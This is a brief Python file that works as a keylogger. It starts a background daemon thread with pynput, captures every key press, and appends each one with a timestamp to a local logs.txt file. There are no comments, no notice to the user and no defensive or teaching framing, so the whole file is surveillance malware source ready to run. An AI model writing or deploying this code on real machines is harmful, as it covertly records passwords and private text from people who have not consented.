from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs.txt')

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, 'a') as f:
        f.write(f'[{timestamp}] {k}\n')

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start() 